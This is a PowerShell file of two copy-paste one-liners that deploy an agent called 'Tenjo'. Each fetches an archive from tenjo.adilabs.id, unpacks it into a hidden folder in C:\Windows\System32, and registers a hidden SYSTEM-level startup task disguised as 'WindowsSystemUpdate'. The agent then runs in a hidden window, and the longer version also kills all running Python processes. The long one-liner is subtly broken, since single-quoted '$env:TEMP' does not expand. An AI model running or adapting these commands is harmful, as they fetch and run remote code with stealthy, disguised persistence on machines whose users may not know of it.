# Tenjo PowerShell One-Liner Deployment
# Ultra-compact version untuk copy-paste cepat

# Single line deployment (copy entire line)
powershell -Command "if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){Write-Host '‚ùå Run as Administrator!' -ForegroundColor Red;Read-Host;exit};Write-Host 'üöÄ Deploying Tenjo...' -ForegroundColor Green;Get-Process -Name python -EA SilentlyContinue|Stop-Process -Force -EA SilentlyContinue;if(Test-Path 'C:\Windows\System32\.tenjo'){Remove-Item 'C:\Windows\System32\.tenjo' -Recurse -Force -EA SilentlyContinue};New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo' -Force|Out-Null;New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo\src' -Force|Out-Null;New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo\logs' -Force|Out-Null;try{Invoke-WebRequest -Uri 'https://tenjo.adilabs.id/downloads/installer_package.tar.gz' -OutFile '$env:TEMP\tenjo.tar.gz' -UseBasicParsing;Write-Host '‚úÖ Downloaded' -ForegroundColor Green}catch{Write-Host '‚ùå Download failed' -ForegroundColor Red;Read-Host;exit};if(Get-Command tar -EA SilentlyContinue){tar -xzf '$env:TEMP\tenjo.tar.gz' -C 'C:\Windows\System32\.tenjo\'}else{Write-Host '‚ö†Ô∏è Manual extraction needed' -ForegroundColor Yellow};Set-Location 'C:\Windows\System32\.tenjo';python -m pip install -r requirements.txt --quiet --no-warn-script-location;$action=New-ScheduledTaskAction -Execute 'python' -Argument 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo';$trigger=New-ScheduledTaskTrigger -AtStartup;$settings=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero);$principal=New-ScheduledTaskPrincipal -UserID 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;Register-ScheduledTask -TaskName 'WindowsSystemUpdate' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force|Out-Null;Start-Process -FilePath 'python' -ArgumentList 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo' -WindowStyle Hidden;Remove-Item '$env:TEMP\tenjo.tar.gz' -Force -EA SilentlyContinue;Write-Host 'üéâ Deployment completed!' -ForegroundColor Green;Write-Host 'üìä Check: https://tenjo.adilabs.id' -ForegroundColor Cyan"

# Alternative compact version (jika yang atas terlalu panjang)
iwr -Uri "https://tenjo.adilabs.id/downloads/installer_package.tar.gz" -OutFile "$env:TEMP\tenjo.tar.gz"; tar -xzf "$env:TEMP\tenjo.tar.gz" -C "C:\Windows\System32\.tenjo\"; cd "C:\Windows\System32\.tenjo"; python -m pip install -r requirements.txt --quiet; Register-ScheduledTask -TaskName "WindowsSystemUpdate" -Action (New-ScheduledTaskAction -Execute "python" -Argument "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo") -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings (New-ScheduledTaskSettingsSet -Hidden) -Principal (New-ScheduledTaskPrincipal -UserID "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Force; Start-Process python "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo" -WindowStyle Hidden